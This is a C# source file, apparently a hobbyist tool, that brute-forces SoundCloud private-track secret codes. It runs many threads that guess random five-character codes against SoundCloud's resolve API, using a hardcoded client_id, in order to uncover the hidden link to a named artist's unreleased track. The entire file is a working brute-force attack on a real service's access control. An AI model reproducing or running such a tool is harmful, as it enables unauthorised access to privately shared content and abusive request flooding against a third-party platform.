using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SoundCloud_Private_Track_Bruteforcer
{
    class Program
    {
        static void Main(string[] args)
        {
            string finalCode = "";
            string generatedCode = ""; 
            List<Thread> Threads = new List<Thread> { };
            int Steps = 0;
            long StartTime;
            long codesChecked = 0;
            bool finished = false;
            StartTime = DateTime.UtcNow.Ticks;

            Console.WriteLine("Searching for Leave by XXXTENTACION SoundCloud Secret Code. Written by Microsocks");
            while (!finished)
            {
                generatedCode = RandomCode();
                Threads.Add(new Thread(() => CheckCode(generatedCode)));
                Threads[Threads.Count - 1].Start();
                if (Threads.Count >= 1000 && !finished) { for (int i = 0; i < Threads.Count; i++) { if (Threads[i].IsAlive == false && !finished) { Threads.RemoveAt(i); } } }
                if (DateTime.UtcNow.Ticks - StartTime >= 10000000 && !finished) { Console.Write("\rCodes Checked Per Second: " + Steps + " Codes Checked: " + codesChecked); StartTime = DateTime.UtcNow.Ticks; Steps = 0; }
            }

            void CheckCode(string Code)
            {
                    string Response = getResponse(Code);
                    if (Response != null)
                    {
                        finalCode = Code;
                        Console.WriteLine("URL Found. URL: " + Code);
                        SaveCodeToFile();
                        finished = true;
                    }
                    else
                    {
                        //Console.WriteLine("Invalid URL");
                        codesChecked++;
                    }
                    Steps++;
            } 

            string getResponse(string code)
            {
                try
                {
                    //WebRequest request = WebRequest.Create("https://api.soundcloud.com/resolve?url=http://soundcloud.com/microsocks/raj-diss-track-ft-jayobeatslayer/s-" + code + "&client_id=v4hEbr6QReyb81OAe82kyvhbvzPOES4V");
                    WebRequest request = WebRequest.Create("https://api.soundcloud.com/resolve?url=http://soundcloud.com/jahseh-onfroy/leave/s-" + code + "&client_id=v4hEbr6QReyb81OAe82kyvhbvzPOES4V");

                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                    return response.ToString();
                }
                catch { return null; }
            }

            
            string RandomCode()
            {
                Random random = new Random();
                const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                return new string(Enumerable.Repeat(chars, 5)
                .Select(s => s[random.Next(s.Length)]).ToArray());
            }

            void SaveCodeToFile()
            {
                System.IO.File.WriteAllText("code.txt", finalCode);
            }
        }
    }
}
